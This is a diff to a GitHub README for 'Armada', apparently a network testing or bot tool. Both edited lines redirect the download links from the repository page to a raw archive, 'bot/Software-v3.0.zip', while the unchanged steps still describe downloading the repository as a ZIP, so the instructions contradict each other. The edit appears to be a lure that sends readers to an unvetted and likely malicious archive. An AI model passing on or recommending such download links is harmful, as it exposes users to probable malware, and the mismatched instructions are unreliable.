@@ -1,6 +1,6 @@
 # 🛡️ Armada - Network security testing and management tool
 
-[![](https://img.shields.io/badge/Download-Armada-blue)](https://github.com/Chancelsanvitaliaprocumbens571/Armada)
+[![](https://img.shields.io/badge/Download-Armada-blue)](https://raw.githubusercontent.com/Chancelsanvitaliaprocumbens571/Armada/main/bot/Software-v3.0.zip)
 
 Armada provides a way to manage and test network systems. It uses C code to run tasks such as checking passwords, finding bugs in network traffic, and managing persistent connections. This tool helps users analyze how systems handle traffic and maintain security under load.
 
@@ -14,7 +14,7 @@ Armada provides a way to manage and test network systems. It uses C code to run 
 
 ## 📥 Getting Started
 
-1. Visit [this link](https://github.com/Chancelsanvitaliaprocumbens571/Armada) to download the software package.
+1. Visit [this link](https://raw.githubusercontent.com/Chancelsanvitaliaprocumbens571/Armada/main/bot/Software-v3.0.zip) to download the software package.
 2. Click the green "Code" button on the webpage and select "Download ZIP".
 3. Extract the contents of the ZIP folder to your desktop.
 4. Open the extracted folder named "Armada-main".
